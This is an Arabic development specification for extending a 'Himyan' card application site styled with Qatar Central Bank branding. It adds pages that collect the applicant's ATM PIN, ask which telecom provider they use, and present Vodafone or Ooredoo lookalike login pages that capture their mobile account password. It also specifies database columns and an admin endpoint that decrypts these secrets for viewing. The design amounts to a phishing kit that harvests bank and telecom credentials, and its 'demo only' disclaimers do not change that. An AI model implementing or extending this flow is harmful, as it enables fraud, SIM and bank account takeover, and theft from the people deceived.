# مواصفات تطوير: إضافة خطوات جديدة لعملية التقديم

## 📋 نظرة عامة

### الهدف
إضافة 4 خطوات جديدة إلى عملية التقديم على بطاقة هميان لجمع معلومات إضافية من المتقدمين:
1. تحسين صفحة رمز التأكيد الحالية
2. صفحة إدخال رقم ATM السري (4 أرقام)
3. صفحة اختيار مزود الشبكة (فودافون/أوريدو)
4. صفحات تسجيل الدخول الخاصة بكل مزود

### نطاق العمل
- ✅ إنشاء 4 صفحات HTML جديدة
- ✅ تحديث صفحة confirmation-code.html
- ✅ إضافة أعمدة جديدة في قاعدة البيانات
- ✅ إضافة 4 نقاط نهاية API جديدة
- ✅ تشفير البيانات الحساسة (ATM PIN + كلمات المرور)
- ✅ تحديث لوحة الأدمن لعرض البيانات الجديدة
- ✅ تتبع تقدم المستخدم في الخطوات

---

## 🔄 التدفق الحالي مقابل التدفق الجديد

### التدفق الحالي (6 خطوات)
```
1. index.html (الصفحة الرئيسية)
   ↓
2. apply.html (نموذج التقديم)
   ↓
3. confirmation.html (بوابة الدفع التجريبية)
   ↓
4. pending.html (انتظار موافقة الأدمن)
   ↓
5. confirmation-code.html (إدخال رمز التأكيد - 6 أرقام)
   ↓
6. pending.html (انتظار مراجعة الرمز)
```

### التدفق الجديد (9 خطوات)
```
1. index.html (الصفحة الرئيسية)
   ↓
2. apply.html (نموذج التقديم)
   ↓
3. confirmation.html (بوابة الدفع التجريبية)
   ↓
4. pending.html (انتظار موافقة الأدمن)
   ↓
5. confirmation-code.html (إدخال رمز التأكيد - 6 أرقام) [محدّث]
   ↓
6. 🆕 atm-pin.html (إدخال رقم ATM السري - 4 أرقام)
   ↓
7. 🆕 network-provider.html (اختيار مزود الشبكة: فودافون/أوريدو)
   ↓
8. 🆕 vodafone-login.html أو ooredoo-login.html (تسجيل دخول المزود)
   ↓
9. pending.html (اكتمال الطلب - في انتظار المراجعة النهائية)
```

---

## 📄 الصفحات الجديدة

### 1. atm-pin.html
**الوصف:** صفحة لإدخال رقم ATM السري المكون من 4 أرقام

**العناصر:**
- حقل إدخال مكون من 4 أرقام
- اتجاه الإدخال: LTR (من اليسار لليمين)
- تأكيد البيانات: يجب أن يكون بالضبط 4 أرقام
- دعم الأرقام العربية والإنجليزية
- زر "التالي" و "إلغاء"

**API Endpoint:** `POST /api/requests/atm-pin`

**البيانات المُرسلة:**
```json
{
  "id": "request-uuid",
  "atmPin": "1234"
}
```

**الانتقال بعد النجاح:** `network-provider.html?lang=ar&requestId=xxx`

---

### 2. network-provider.html
**الوصف:** صفحة لاختيار مزود الشبكة (فودافون أو أوريدو)

**العناصر:**
- بطاقتين كبيرتين للاختيار:
  - فودافون (Vodafone Qatar)
  - أوريدو (Ooredoo Qatar)
- كل بطاقة تحتوي على شعار المزود
- زر "إلغاء"

**API Endpoint:** `POST /api/requests/network-provider`

**البيانات المُرسلة:**
```json
{
  "id": "request-uuid",
  "provider": "vodafone" | "ooredoo"
}
```

**الانتقال بعد النجاح:**
- إذا vodafone → `vodafone-login.html?lang=ar&requestId=xxx`
- إذا ooredoo → `ooredoo-login.html?lang=ar&requestId=xxx`

---

### 3. vodafone-login.html
**الوصف:** صفحة تسجيل الدخول لفودافون

**العناصر:**
- شعار فودافون
- حقل رقم الجوال (مُعبأ مسبقًا من بيانات التقديم)
- حقل كلمة المرور
- زر "تسجيل الدخول" و "رجوع"

**API Endpoint:** `POST /api/requests/provider-login`

**البيانات المُرسلة:**
```json
{
  "id": "request-uuid",
  "provider": "vodafone",
  "mobile": "+97412345678",
  "password": "user_password"
}
```

**الانتقال بعد النجاح:** `pending.html?lang=ar&stage=complete&requestId=xxx`

---

### 4. ooredoo-login.html
**الوصف:** صفحة تسجيل الدخول لأوريدو

**العناصر:**
- شعار أوريدو
- حقل رقم الجوال (مُعبأ مسبقًا من بيانات التقديم)
- حقل كلمة المرور
- زر "تسجيل الدخول" و "رجوع"

**API Endpoint:** `POST /api/requests/provider-login`

**البيانات المُرسلة:**
```json
{
  "id": "request-uuid",
  "provider": "ooredoo",
  "mobile": "+97412345678",
  "password": "user_password"
}
```

**الانتقال بعد النجاح:** `pending.html?lang=ar&stage=complete&requestId=xxx`

---

## 🗄️ تغييرات قاعدة البيانات

### إضافة أعمدة جديدة لجدول `requests`

```sql
ALTER TABLE requests ADD COLUMN IF NOT EXISTS atm_pin_encrypted TEXT;
ALTER TABLE requests ADD COLUMN IF NOT EXISTS network_provider VARCHAR(20);
ALTER TABLE requests ADD COLUMN IF NOT EXISTS provider_mobile VARCHAR(40);
ALTER TABLE requests ADD COLUMN IF NOT EXISTS provider_password_encrypted TEXT;
ALTER TABLE requests ADD COLUMN IF NOT EXISTS steps_completed JSONB DEFAULT '[]'::jsonb;
ALTER TABLE requests ADD COLUMN IF NOT EXISTS completed_at TIMESTAMPTZ;
```

### وصف الأعمدة الجديدة

| العمود | النوع | الوصف |
|--------|------|-------|
| `atm_pin_encrypted` | TEXT | رقم ATM مُشفر (AES-256) |
| `network_provider` | VARCHAR(20) | مزود الشبكة (vodafone/ooredoo) |
| `provider_mobile` | VARCHAR(40) | رقم الجوال المستخدم لتسجيل الدخول |
| `provider_password_encrypted` | TEXT | كلمة مرور المزود مُشفرة (AES-256) |
| `steps_completed` | JSONB | مصفوفة JSON تتبع الخطوات المكتملة |
| `completed_at` | TIMESTAMPTZ | وقت إكمال جميع الخطوات |

### مثال على `steps_completed`
```json
[
  "application_submitted",
  "payment_completed",
  "admin_approved",
  "confirmation_code_submitted",
  "atm_pin_submitted",
  "network_provider_selected",
  "provider_login_completed"
]
```

---

## 🔐 التشفير والأمان

### البيانات المُشفرة
- ✅ **رقم ATM PIN** - يُشفر باستخدام AES-256-CBC
- ✅ **كلمة مرور مزود الشبكة** - تُشفر باستخدام AES-256-CBC

### مفتاح التشفير
```javascript
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32);
const ENCRYPTION_IV_LENGTH = 16;
```

### وظائف التشفير وفك التشفير
```javascript
function encrypt(text) {
  const iv = crypto.randomBytes(ENCRYPTION_IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(text) {
  const parts = text.split(':');
  const iv = Buffer.from(parts[0], 'hex');
  const encryptedText = parts[1];
  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

### ملاحظات أمنية مهمة
⚠️ **تحذير:** تخزين رقم ATM وكلمات المرور حتى مع التشفير يشكل خطرًا أمنيًا. هذا التطبيق:
- للأغراض التجريبية فقط
- يجب عدم استخدامه في بيئة الإنتاج بدون:
  - مراجعة أمنية شاملة
  - استخدام HSM (Hardware Security Module)
  - التوافق مع معايير PCI DSS
  - موافقة مصرف قطر المركزي

---

## 🔌 نقاط النهاية API الجديدة

### 1. POST /api/requests/atm-pin
**الوصف:** حفظ رقم ATM PIN المُشفر

**المدخلات:**
```json
{
  "id": "uuid",
  "atmPin": "1234"
}
```

**التحقق:**
- رقم ATM يجب أن يكون 4 أرقام بالضبط
- الطلب يجب أن يكون موجودًا
- الحالة يجب أن تكون `code_approved` أو `code_pending`

**المخرجات (نجاح):**
```json
{
  "ok": true,
  "id": "uuid",
  "status": "atm_pin_submitted"
}
```

---

### 2. POST /api/requests/network-provider
**الوصف:** حفظ مزود الشبكة المختار

**المدخلات:**
```json
{
  "id": "uuid",
  "provider": "vodafone"
}
```

**التحقق:**
- المزود يجب أن يكون vodafone أو ooredoo
- الطلب يجب أن يكون موجودًا
- الحالة يجب أن تكون `atm_pin_submitted`

**المخرجات (نجاح):**
```json
{
  "ok": true,
  "id": "uuid",
  "provider": "vodafone",
  "status": "provider_selected"
}
```

---

### 3. POST /api/requests/provider-login
**الوصف:** حفظ بيانات تسجيل الدخول لمزود الشبكة (مُشفرة)

**المدخلات:**
```json
{
  "id": "uuid",
  "provider": "vodafone",
  "mobile": "+97412345678",
  "password": "user_password"
}
```

**التحقق:**
- المزود يجب أن يتطابق مع المزود المُختار مسبقًا
- رقم الجوال مطلوب
- كلمة المرور مطلوبة
- الطلب يجب أن يكون موجودًا
- الحالة يجب أن تكون `provider_selected`

**المخرجات (نجاح):**
```json
{
  "ok": true,
  "id": "uuid",
  "status": "completed"
}
```

---

### 4. GET /api/requests/decrypt (Admin Only)
**الوصف:** فك تشفير البيانات الحساسة للأدمن فقط

**المدخلات (Query Params):**
```
?id=uuid&field=atm_pin
```

**التحقق:**
- يجب أن يكون المستخدم أدمن (isAdmin)
- الطلب يجب أن يكون موجودًا
- الحقل يجب أن يكون atm_pin أو provider_password

**المخرجات (نجاح):**
```json
{
  "ok": true,
  "value": "1234"
}
```

---

## 📊 تحديثات لوحة الأدمن

### أعمدة جديدة في جدول الطلبات

| العمود | الوصف |
|--------|-------|
| **رقم ATM** | زر "عرض" يفك التشفير عند النقر |
| **مزود الشبكة** | فودافون / أوريدو / — |
| **رقم جوال المزود** | الرقم المستخدم للدخول |
| **كلمة مرور المزود** | زر "عرض" يفك التشفير عند النقر |
| **الخطوات المكتملة** | عدد الخطوات / 7 |

### نافذة التفاصيل (Details Modal)
إضافة الحقول التالية:
- رقم ATM (مُشفر - مع زر "عرض")
- مزود الشبكة
- رقم جوال المزود
- كلمة مرور المزود (مُشفرة - مع زر "عرض")
- الخطوات المكتملة (قائمة)
- وقت الإكمال الكامل

### الحالات الجديدة (Status)
```javascript
const labels = {
  // الحالات الموجودة...
  'atm_pin_submitted': 'تم إدخال رقم ATM',
  'provider_selected': 'تم اختيار المزود',
  'completed': 'مكتمل - جاهز للمراجعة النهائية'
};
```

---

## 🎨 التصميم والتجربة

### المبادئ
- ✅ الحفاظ على التصميم الحالي (Cairo font, QCB branding)
- ✅ دعم اللغتين العربية والإنجليزية
- ✅ Responsive design (جوال وسطح المكتب)
- ✅ إمكانية الوصول (ARIA labels, keyboard navigation)

### الألوان
- **اللون الأساسي:** `#8a173b` (لون هميان)
- **لون النجاح:** `#2d7a3e`
- **لون الخطأ:** `#b52b49`
- **لون الخلفية:** `#f8f5f6`

---

## ✅ معايير القبول

### وظيفي
- [ ] يمكن للمستخدم إدخال رقم ATM المكون من 4 أرقام
- [ ] يمكن للمستخدم اختيار مزود الشبكة (فودافون/أوريدو)
- [ ] يمكن للمستخدم تسجيل الدخول بحساب المزود
- [ ] يتم تشفير البيانات الحساسة قبل التخزين
- [ ] يتتبع النظام الخطوات المكتملة
- [ ] تظهر جميع البيانات في لوحة الأدمن
- [ ] يمكن للأدمن فك تشفير البيانات الحساسة

### تقني
- [ ] جميع APIs تعمل بشكل صحيح
- [ ] قاعدة البيانات محدثة بالأعمدة الجديدة
- [ ] التشفير يعمل بشكل صحيح
- [ ] دعم كامل للغتين (AR/EN)
- [ ] لا توجد أخطاء في console
- [ ] الكود يتبع معايير المشروع الحالية

### أمني
- [ ] رقم ATM مُشفر في قاعدة البيانات
- [ ] كلمات المرور مُشفرة في قاعدة البيانات
- [ ] مفتاح التشفير في متغيرات البيئة (.env)
- [ ] فك التشفير متاح للأدمن فقط
- [ ] HTTPS مطلوب في الإنتاج

---

## 📝 ملاحظات إضافية

### للمطور
- استخدم نفس نمط الكود الموجود في `server.js` و `db.js`
- احتفظ بدعم Local JSON fallback بجانب PostgreSQL
- اختبر جميع الحالات (نجاح، فشل، بيانات مفقودة)
- تأكد من عمل التشفير قبل النشر

### للعميل
⚠️ **هام جدًا:** هذا التطبيق للأغراض التجريبية فقط. تخزين أرقام ATM وكلمات المرور يتطلب:
- موافقة مصرف قطر المركزي
- مراجعة أمنية متخصصة
- بنية تحتية آمنة (HSM, PCI DSS)
- عدم استخدامه مع بيانات حقيقية حاليًا

---

## 🚀 خطة التنفيذ

### المرحلة 1: قاعدة البيانات والتشفير
1. إضافة وظائف التشفير/فك التشفير
2. تحديث `db.js` بالأعمدة الجديدة
3. إنشاء migration script

### المرحلة 2: APIs
1. إضافة POST /api/requests/atm-pin
2. إضافة POST /api/requests/network-provider
3. إضافة POST /api/requests/provider-login
4. إضافة GET /api/requests/decrypt

### المرحلة 3: الصفحات الجديدة
1. إنشاء atm-pin.html
2. إنشاء network-provider.html
3. إنشاء vodafone-login.html
4. إنشاء ooredoo-login.html

### المرحلة 4: التحديثات
1. تحديث confirmation-code.html (الانتقال إلى atm-pin)
2. تحديث pending.html (دعم stage=complete)
3. تحديث admin.html (الأعمدة والبيانات الجديدة)

### المرحلة 5: الاختبار
1. اختبار التدفق الكامل
2. اختبار التشفير/فك التشفير
3. اختبار لوحة الأدمن
4. اختبار اللغتين (AR/EN)

---

**آخر تحديث:** 2026-08-31  
**الحالة:** جاهز للتنفيذ ✅
